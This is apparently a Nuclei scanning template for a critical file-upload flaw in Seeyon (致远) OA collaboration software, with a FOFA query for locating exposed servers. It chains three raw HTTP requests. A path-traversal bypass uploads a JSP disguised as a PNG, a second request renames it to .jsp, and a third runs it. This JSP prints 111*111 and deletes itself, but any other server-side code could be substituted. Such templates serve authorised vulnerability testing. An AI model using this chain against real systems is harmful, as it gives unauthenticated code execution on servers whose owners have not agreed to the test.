id: seeyon-oa-fileupload-fileupload

info:
  name: 致远互联 OA fileUpload.do 文件上传漏洞
  author: SleepingBag945
  severity: critical
  metadata: 
    fofa-query: title="协同管理软件 V5.6SP1"

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-Type: multipart/form-data; boundary=skdHHhNHjhnUgerSexsksboundary
        User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)
        Content-Length: 854

        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="type"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="extensions"

        png
        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="applicationCategory"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="destDirectory"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="destFilename"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="maxSize"


        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="isEncrypt"

        false
        --skdHHhNHjhnUgerSexsksboundary
        Content-Disposition: form-data; name="file1"; filename="{{randstr_1}}.png"
        Content-Type: Content-Type: application/pdf

        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --skdHHhNHjhnUgerSexsksboundary--
      
      - |
        POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Content-type: application/x-www-form-urlencoded

        method=uploadMenuIcon&fileid={{fileid}}&filename={{filename}}.jsp
      - |
        GET /seeyon/main/menuIcon/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}


    extractors:
      - type: regex
        name: fileid
        part: body_1
        group: 1
        internal: true
        regex:
          - 'fileurls\+","\+''(.*?)'''

    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1==200 && contains_all(body_1,"fileurls")
          - status_code_2==200
          - status_code_3==200 && contains_all(body_3,"12321")

